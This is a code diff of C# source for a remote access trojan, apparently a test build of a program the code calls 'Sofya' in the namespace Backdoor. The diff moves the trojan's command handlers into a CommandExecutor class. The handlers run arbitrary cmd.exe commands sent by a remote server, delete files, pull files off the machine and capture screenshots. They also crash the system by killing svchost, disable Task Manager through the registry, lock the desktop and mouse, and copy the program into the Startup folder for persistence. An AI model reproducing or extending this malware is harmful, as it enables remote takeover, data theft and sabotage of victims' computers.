@@ -9,6 +9,7 @@ using System.Windows.Forms;
 using System.Text.RegularExpressions;
 using System.Xml;
 using System.Drawing;
+using System.Threading;
 
 namespace Backdoor
 {
@@ -16,6 +17,8 @@ namespace Backdoor
     {
         static void Main(string[] args)
         {
+            Console.WriteLine("Привет это тестовая сборка трояна Софья(или София или Cоня и Софа)");
+            Console.WriteLine("Консоль можно будет скрыть в настройках");
             var server = new Server();
             server.Connect();
         }
@@ -59,351 +62,165 @@ namespace Backdoor
                 {
                     bytesRec = conn.Receive(bytes);
                 }
-                catch
-                {
-                    Connect();
-                    break;
-                }
+                catch { Connect(); break; }
 
+                CommandExecutor executor = new CommandExecutor();
                 data = Encoding.UTF8.GetString(bytes, 0, bytesRec);
 
 
                 Console.Write("Полученный текст: " + data + "\n\n"); ;
 
-                if (data.StartsWith("ls"))
+                try
                 {
-                    data = data.Remove(0, 2);
-                    string path = ParseComand(data);
-                    var dirFiles = Directory.GetFiles(path);
-                    var directoris = Directory.GetDirectories(path);
-                    string files = "";
-
-                    files += "<files> ";
-                    for (int i = 0; i < dirFiles.Length; i++)
+                    if (data.StartsWith("ls"))
                     {
-                        files += $" <file{i}> " + Path.GetFileName(dirFiles[i]) + $" </file{i}>";
-                    }
-                    for (int i = 0; i < directoris.Length; i++)
-                    {
-                        files += $" <dir{i}> " + "/" + Path.GetFileName(directoris[i]) + $" </dir{i}>";
-                    }
-                    files += " </files>";
-                    conn.Send(Encoding.UTF8.GetBytes(files));
-                    data = "";//чтобы система не упала
-                    continue;
-                }
-
-                if (data.StartsWith("rm"))
-                {
-
-                    data = data.Remove(0, 2);
-                    string path = ParseComand(data);
-                    try { File.Delete(path); } catch { }
-                    try { Directory.Delete(path, true); } catch { }
-
-                    conn.Send(Encoding.UTF8.GetBytes("Файл " + path + " удалён."));
-                    data = "";//чтобы система не упала
-                    continue;
-                }
-
-                if (data.StartsWith("start"))
-                {
-
-                    data = data.Remove(0, 5);
-                    string path = ParseComand(data);
-
-                    //Process myProcess = new Process();
-                    //myProcess.StartInfo.FileName = path;
-                    try
-                    {
-                        var t = new System.Threading.Thread(() => Process.Start(path));
-                        t.Start();
-                    }
-                    catch (Exception e)
-                    {
-                        conn.Send(Encoding.UTF8.GetBytes("Ошибка: " + e.Message));
+                        data = data.Remove(0, 2);
+                        string path = ParseComand(data);
+                        var files = executor.ScanDirectoryFromXml(path);
+                        conn.Send(Encoding.UTF8.GetBytes(files));
                         continue;
                     }
 
-                    conn.Send(Encoding.UTF8.GetBytes("Процесс " + path + " запущён."));
-                    data = "";//чтобы система не упала
-                    continue;
-                }
-
-
-                if (data.StartsWith("pkill"))
-                {
-                    data = data.Remove(0, 5);
-                    var pname = ParseComand(data);
-                    var process = Process.GetProcesses();
-                    for (int i = 0; i < process.Length; i++)
+                    if (data.StartsWith("rm"))
                     {
-                        if (process[i].ProcessName == pname)
+                        data = data.Remove(0, 2);
+                        string path = ParseComand(data);
+                        executor.RemoveFileOrDirectory(path);
+                        conn.Send(Encoding.UTF8.GetBytes("Файл " + path + " удалён."));
+                        continue;
+                    }
+
+                    if (data.StartsWith("start"))
+                    {
+
+                        data = data.Remove(0, 5);
+                        string path = ParseComand(data);
+                        executor.StartFile(path);
+                        conn.Send(Encoding.UTF8.GetBytes("Процесс " + path + " запущён."));
+                        continue;
+                    }
+
+
+                    if (data.StartsWith("pkill"))
+                    {
+                        data = data.Remove(0, 5);
+                        var pname = ParseComand(data);
+                        executor.pkill(pname);
+                        conn.Send(Encoding.UTF8.GetBytes("Процесс с именем " + pname + " уничтожен"));
+                        continue;
+                    }
+
+                    if (data == "tasklist")
+                    {
+                        string tasks = executor.GetAllTasksInSysFromXml();
+                        conn.Send(Encoding.UTF8.GetBytes(tasks));
+                        continue;
+                    }
+
+                    if (data.StartsWith("cmd"))
+                    {
+                        data = data.Remove(0, 3);
+                        string comm = ParseComand(data);
+                        var result = executor.ExecuteCmdCommand(comm);
+                        conn.Send(Encoding.UTF8.GetBytes(result));
+                        continue;
+                    }
+
+                    if (data.StartsWith("msg"))
+                    {
+                        data = data.Remove(0, 3);
+                        string msg = ParseComand(data);
+                        executor.ShowUserMsg(msg);
+                        conn.Send(Encoding.UTF8.GetBytes($"Сообщение отправлено"));
+                        continue;
+                    }
+                    if (data.StartsWith("enTaskmgr"))
+                    {
+                        data = data.Remove(0, 9);
+                        string comm = ParseComand(data);
+                        if (comm == "true")
                         {
-                            process[i].Kill();
-                            break;
+                            executor.UnLockTaskMgr();
+                            conn.Send(Encoding.UTF8.GetBytes($"Диспетчер задач включен"));
                         }
-                    }
-                    conn.Send(Encoding.UTF8.GetBytes("Процесс с именем " + pname + " уничтожен"));
-                    data = "";//чтобы система не упала
-                    continue;
-                }
-
-                if (data == "tasklist")
-                {
-                    string tasks = "";
-
-                    var process = Process.GetProcesses();
-                    tasks += "<tasklist>";
-                    for (int i = 0; i < process.Length; i++)
-                    {
-                        tasks += "<task>" + process[i].ProcessName + "</task>";
-                    }
-                    tasks += "</tasklist>";
-                    /*
-                    for (int i = 0; i < process.Length; i++)
-                    {
-                        tasks += " " + "_task" + process[i].ProcessName + " ";
-                    }
-                    */
-                    var pmsg = Encoding.UTF8.GetBytes(tasks);//"Все процессы в системе: " + "\r\n " + tasks + " ");
-                    if (pmsg.Length > 9999) Array.Resize(ref pmsg, 9999);
-                    conn.Send(pmsg);
-                    data = ""; //чтобы система не упала
-                    continue;
-                }
-
-                if (data.StartsWith("cmd"))
-                {
-                    data = data.Remove(0, 3);
-                    string comm = ParseComand(data);
-                    Console.WriteLine(comm);
-
-                    var proc = new Process();
-                    proc.StartInfo.RedirectStandardOutput = true;
-                    proc.StartInfo.UseShellExecute = false;
-                    proc.StartInfo.FileName = "CMD.exe";
-                    proc.StartInfo.Arguments = " /C " + comm;
-                    proc.Start();
-                    string result = proc.StandardOutput.ReadToEnd();
-                    conn.Send(Encoding.UTF8.GetBytes(result));
-                    data = "";//чтобы система не упала
-
-                    continue;
-                }
-
-                if (data.StartsWith("msg"))
-                {
-                    data = data.Remove(0, 3);
-
-
-                    string msg = ParseComand(data);
-                    //string sub = ParseComand(data, '&');
-
-                    XmlDocument doc = new XmlDocument();
-                    string docContent = msg;
-                    doc.LoadXml(docContent);
-
-                    XmlNode root = doc.FirstChild;
-
-                    var textMsg = "";
-                    var textSub = "";
-                    var textBut = "";
-                    var textIco = "";
-
-                    if (root.HasChildNodes)
-                    {
-                        for (int i = 0; i < root.ChildNodes.Count; i++)
+                        if (comm == "false")
                         {
-                            if (root.ChildNodes[i].Name == "text")
-                                textMsg = root.ChildNodes[i].InnerText;
-                            if (root.ChildNodes[i].Name == "subject")
-                                textSub = root.ChildNodes[i].InnerText;
-                            if (root.ChildNodes[i].Name == "but")
-                                textBut = root.ChildNodes[i].InnerText;
-                            if (root.ChildNodes[i].Name == "ico")
-                                textIco = root.ChildNodes[i].InnerText;
+                            executor.LockTaskMgr();
+                            conn.Send(Encoding.UTF8.GetBytes($"Диспетчер задач выключен"));
                         }
+                        continue;
                     }
-                    SendMSG(textMsg, textSub, int.Parse(textBut), int.Parse(textIco));
-
-                    conn.Send(Encoding.UTF8.GetBytes($"Сообщение отправлено"));
-                    data = "";
-
-                    continue;
-                }
-                if (data.StartsWith("enTaskmgr"))
-                {
-                    data = data.Remove(0, 9);
-                    string comm = ParseComand(data);
-                    if (comm == "true")
+                    if (data == "bluescreen")
                     {
-                        SetTaskManager(true);
-                        conn.Send(Encoding.UTF8.GetBytes($"Диспетчер задач включен"));
+                        executor.CrashSystem();
+                        conn.Send(Encoding.UTF8.GetBytes("Система успешно крашнута"));
+                        continue;
                     }
-                    if (comm == "false")
+                    if (data.StartsWith("download"))
                     {
-                        SetTaskManager(false);
-                        conn.Send(Encoding.UTF8.GetBytes($"Диспетчер задач выключен"));
-                    }
-                    data = "";
-
-                    continue;
-                }
-                if (data == "bluescreen")
-                {
-
-                    var process = Process.GetProcesses();
-                    for (int i = 0; i < process.Length; i++)
-                    {
-                        if (process[i].ProcessName == "svchost")
-                        {
-                            process[i].Kill();
-                            break;
-                        }
-                    }
-                    conn.Send(Encoding.UTF8.GetBytes("Система успешно крашнута"));
-                    data = "";//чтобы система не упала
-                    continue;
-                }
-                if (data.StartsWith("download"))
-                {
-                    data = data.Remove(0, 3);
-                    string comm = ParseComand(data);
-                    Console.WriteLine(comm);
-                    try
-                    {
-                        /*
-                        var msg = "<file>";
-                        
-                        var FileInString = Encoding.UTF8.GetString(File.ReadAllBytes(comm));
-                        msg += "<fname>" + Path.GetFileName(comm) + "</fname>";
-                        msg += "<bytesArr>" + FileInString + "</bytesArr>";
-                        msg += "</file>";
-                        var bytesFile = Encoding.UTF8.GetBytes(msg);
-
-                        if (bytesFile.Length > 9999)
-                        {
-                            throw new Exception("Тобi пзда");
-                        }
-                        */
+                        data = data.Remove(0, 3);
+                        string comm = ParseComand(data);
                         conn.Send(File.ReadAllBytes(comm));
-                    }
-                    catch
-                    {
                         conn.Send(Encoding.UTF8.GetBytes("Не получилось скачать файл"));
-                        data = "";//чтобы система не упала
                         continue;
                     }
-                    data = "";//чтобы система не упала
-
-                    continue;
-                }
-                if (data.StartsWith("transl"))
-                {
-                    var comm = ParseComand(data);
-                    if (comm == "get")
+                    if (data.StartsWith("transl"))
                     {
-                        var msg = "";
-                        //msg += "<msg>";
-                        //msg += "<frame>";
-                        Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
-
-
-                        Graphics graphics = Graphics.FromImage(bitmap as System.Drawing.Image);
-                        graphics.CopyFromScreen(0, 0, 0, 0, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height));
-
-
-                        //File.WriteAllBytes("kek.jpg", bytes);
-                        bitmap = ResizeImg(1140, 641, bitmap);
-
-                        MemoryStream stream = new MemoryStream();
-                        bitmap.Save(stream, System.Drawing.Imaging.ImageFormat.Jpeg);
-                        Byte[] bytesForSend = stream.ToArray();
-
-                        //msg += Convert.ToBase64String(bytesForSend);
-                        //msg += "</frame>";
-                        //msg += "</msg>";
-
-                        conn.Send(bytesForSend);
-                        data = "";
-                        continue;
-                    }
-                }
-                if (data.StartsWith("block"))
-                {
-                    data = data.Remove(0, 5);
-                    string comm = ParseComand(data);
-                    Console.WriteLine(comm);
-                    if (comm == "true")
-                    {
-                        try
+                        var comm = ParseComand(data);
+                        if (comm == "get")
                         {
-                            var process = Process.GetProcesses();
-                            for (int i = 0; i < process.Length; i++)
-                            {
-                                if (process[i].ProcessName == "explorer")
-                                {
-                                    process[i].Kill();
-                                    break;
-                                }
-                            }
-                            foreach (Process proc in process)
-                            {
-                                if (!String.IsNullOrEmpty(proc.MainWindowTitle))
-                                {
-                                    Console.WriteLine("Process: {0} ID: {1} Window title: {2}", proc.ProcessName, proc.Id, proc.MainWindowTitle);
-                                }
-                            }
+                            conn.Send(executor.CaptureScreenAndTransleteToBytes());
+                            continue;
+                        }
+                    }
+                    if (data.StartsWith("block"))
+                    {
+                        data = data.Remove(0, 5);
+                        string comm = ParseComand(data);
+                        if (comm == "true")
+                        {
+                            executor.LockSystem();
                             conn.Send(Encoding.UTF8.GetBytes("заблокированно"));
                             continue;
                         }
-                        catch
+                        if (comm == "false")
                         {
-                            conn.Send(Encoding.UTF8.GetBytes("Не получилось заблокировать"));
-                            data = "";
+                            executor.UnLockSystem();
+                            conn.Send(Encoding.UTF8.GetBytes("разблокированно"));
+                            continue;
+                        }
+                        else
+                        {
+                            throw new Exception("блокировка системы: неверный аргумент");
+                        }
+                    }
+                    if (data.StartsWith("curblock"))
+                    {
+                        data = data.Remove(0, 5);
+                        string comm = ParseComand(data);
+                        if (comm == "true")
+                        {
+                            executor.LockMouse();
+                            conn.Send(Encoding.UTF8.GetBytes("курсор заблокирован"));
+                            continue;
+                        }
+                        if (comm == "false")
+                        {
+                            executor.UnLockMouse();
+                            conn.Send(Encoding.UTF8.GetBytes("курсор разблокирован"));
                             continue;
                         }
                     }
-                    if(comm == "false")
-                    {
-                        conn.Send(Encoding.UTF8.GetBytes("разблокированно"));
-                        continue;
-                    }
-                    else
-                    {
-                        conn.Send(Encoding.UTF8.GetBytes("случилось что-то не понятное"));
-                        continue;
-                    }
-                    data = "";
-
-                    continue;
                 }
-                if (data.StartsWith("curblock"))
+                catch (Exception e)
                 {
-                    data = data.Remove(0, 5);
-                    string comm = ParseComand(data);
-                    Console.WriteLine(comm);
-                    if (comm == "true")
-                    {
-                        conn.Send(Encoding.UTF8.GetBytes("курсор заблокирован"));
-                        continue;
-                    }
-                    if (comm == "false")
-                    {
-                        conn.Send(Encoding.UTF8.GetBytes("курсор разблокирован"));
-                        continue;
-                    }
+                    conn.Send(Encoding.UTF8.GetBytes("Ошибка: " + e.Message + " Sourse:" + e.Source));
                 }
-                conn.Send(Encoding.UTF8.GetBytes("Ошибка"));
-                data = "";
             }
         }
         public static string ParseComand(string allcommand, Char attribute = '$')
         {
             string commandBody = "";
-
-
             bool flag = false;
             for (int i = 0; i < allcommand.Length; i++)
             {
@@ -414,33 +231,221 @@ namespace Backdoor
             }
             return commandBody;
         }
+    }
+    public class CommandExecutor
+    {
+        private static Thread blockMouseThread = null;
+
+        [System.Runtime.InteropServices.DllImport("user32")]
+        private static extern int SetCursorPos(int x, int y);
+
+        public CommandExecutor()
+        {
+
+        }
+        public void pkill(int pid)
+        {
+            var process = Process.GetProcesses();
+            for (int i = 0; i < process.Length; i++)
+            {
+                if (process[i].Id == pid)
+                {
+                    process[i].Kill();
+                    break;
+                }
+            }
+        }
+        public void pkill(string pname)
+        {
+            var process = Process.GetProcesses();
+            for (int i = 0; i < process.Length; i++)
+            {
+                if (process[i].ProcessName == pname)
+                {
+                    process[i].Kill();
+                    break;
+                }
+            }
+        }
+        public string GetAllTasksInSysFromXml()
+        {
+            string tasks = "";
+
+            var process = Process.GetProcesses();
+            tasks += "<tasklist>";
+            for (int i = 0; i < process.Length; i++)
+            {
+                tasks += "<task>" + process[i].ProcessName + "</task>";
+            }
+            tasks += "</tasklist>";
+            return tasks;
+        }
+        public string ScanDirectoryFromXml(string path)
+        {
+            var dirFiles = Directory.GetFiles(path);
+            var directoris = Directory.GetDirectories(path);
+            string files = "";
+
+            files += "<files> ";
+            for (int i = 0; i < dirFiles.Length; i++)
+            {
+                files += $" <file{i}> " + Path.GetFileName(dirFiles[i]) + $" </file{i}>";
+            }
+            for (int i = 0; i < directoris.Length; i++)
+            {
+                files += $" <dir{i}> " + "/" + Path.GetFileName(directoris[i]) + $" </dir{i}>";
+            }
+            files += " </files>";
+            return files;
+        }
+        public void RemoveFileOrDirectory(string path)
+        {
+            try { File.Delete(path); } catch { }
+            try { Directory.Delete(path, true); } catch { }
+        }
+        public void StartFile(string path)
+        {
+            var t = new Thread(() => Process.Start(path));
+            t.Start();
+        }
+        public byte[] GetFileFroUpload()
+        {
+            return new byte[1];
+        }
+        public string ExecuteCmdCommand(string comm)
+        {
+            var proc = new Process();
+            proc.StartInfo.RedirectStandardOutput = true;
+            proc.StartInfo.UseShellExecute = false;
+            proc.StartInfo.FileName = "CMD.exe";
+            proc.StartInfo.Arguments = " /C " + comm;
+            proc.Start();
+            return proc.StandardOutput.ReadToEnd();
+        }
+        public void CrashSystem()
+        {
+            var process = Process.GetProcesses();
+            for (int i = 0; i < process.Length; i++)
+            {
+                if (process[i].ProcessName == "svchost")
+                {
+                    process[i].Kill();
+                    break;
+                }
+            }
+        }
+        public void ShowUserMsg(string docContent)
+        {
+            XmlDocument doc = new XmlDocument();
+            doc.LoadXml(docContent);
+
+            XmlNode root = doc.FirstChild;
+
+            var textMsg = "";
+            var textSub = "";
+            var textBut = "";
+            var textIco = "";
+
+            if (root.HasChildNodes)
+            {
+                for (int i = 0; i < root.ChildNodes.Count; i++)
+                {
+                    if (root.ChildNodes[i].Name == "text")
+                        textMsg = root.ChildNodes[i].InnerText;
+                    if (root.ChildNodes[i].Name == "subject")
+                        textSub = root.ChildNodes[i].InnerText;
+                    if (root.ChildNodes[i].Name == "but")
+                        textBut = root.ChildNodes[i].InnerText;
+                    if (root.ChildNodes[i].Name == "ico")
+                        textIco = root.ChildNodes[i].InnerText;
+                }
+            }
+            var t = new Thread(() => MessageBox.Show(textMsg, textSub, (MessageBoxButtons)int.Parse(textBut), MessageBoxIcon.Error));
+            t.Start();
+        }
+        public byte[] CaptureScreenAndTransleteToBytes()
+        {
+            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+
+
+            Graphics graphics = Graphics.FromImage(bitmap as System.Drawing.Image);
+            graphics.CopyFromScreen(0, 0, 0, 0, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height));
+
+            bitmap = ResizeImg(1140, 641, bitmap);
+
+            MemoryStream stream = new MemoryStream();
+            bitmap.Save(stream, System.Drawing.Imaging.ImageFormat.Jpeg);
+            Byte[] bytesForSend = stream.ToArray();
+
+            return bytesForSend;
+        }
+        public void LockMouse()
+        {
+            if (blockMouseThread != null) return;
+            blockMouseThread = new Thread(() => SetZeroMouseInInfLoop());
+            blockMouseThread.Start();
+        }
+        public void UnLockMouse()
+        {
+            if (blockMouseThread != null) blockMouseThread.Abort();
+            blockMouseThread = null;
+        }
+        public void LockSystem()
+        {
+            LockTaskMgr();
+            var process = Process.GetProcesses();
+            for (int i = 0; i < process.Length; i++)
+            {
+                if (process[i].ProcessName == "Backdoor")
+                {
+                    continue;
+                }
+                if (process[i].ProcessName == "explorer")
+                {
+                    process[i].Kill();
+                }
+                if (!String.IsNullOrEmpty(process[i].MainWindowTitle))
+                {
+                    process[i].Kill();
+                }
+            }
+            LockMouse();
+        }
+        public void UnLockSystem()
+        {
+            StartFile("c:/Windows/explorer.exe");
+            UnLockMouse();
+        }
+        public void LockTaskMgr()
+        {
+            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
+        @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
+
+            objRegistryKey.SetValue("DisableTaskMgr", "1");
+            objRegistryKey.Close();
+        }
+        public void UnLockTaskMgr()
+        {
+            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
+@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
+            if (objRegistryKey.GetValue("DisableTaskMgr") != null)
+                objRegistryKey.DeleteValue("DisableTaskMgr");
+        }
         public static void AddToStartUp()
         {
             var startPath = "c:/Users/VASUS/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";
-            var dir = Directory.GetCurrentDirectory();
+            var dir = Directory.GetCurrentDirectory() + "/Backdoor.exe";
+            File.Copy(dir, startPath);
         }
-
-        public static void SetTaskManager(bool enable)
+        private void SetZeroMouseInInfLoop()
         {
-            try
+            while (true)
             {
-                RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
-                    @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
-                if (enable && objRegistryKey.GetValue("DisableTaskMgr") != null)
-                    objRegistryKey.DeleteValue("DisableTaskMgr");
-                else
-                    objRegistryKey.SetValue("DisableTaskMgr", "1");
-                objRegistryKey.Close();
-            }
-            catch
-            {
+                Thread.Sleep(50);
+                SetCursorPos(0, 0);
             }
         }
-        public static async void SendMSG(string msg, string subject, int butNum, int icoNum)
-        {
-            await System.Threading.Tasks.Task.Run(() => MessageBox.Show(msg, subject, (MessageBoxButtons)butNum, MessageBoxIcon.Error));
-        }
-        private static Bitmap ResizeImg(int newWidth, int newHeight, Bitmap imgToResize)
+        private Bitmap ResizeImg(int newWidth, int newHeight, Bitmap imgToResize)
         {
             Bitmap b = new Bitmap(newWidth, newHeight);
             Graphics g = Graphics.FromImage((Image)b);
@@ -452,5 +457,4 @@ namespace Backdoor
             return b;
         }
     }
-
 }
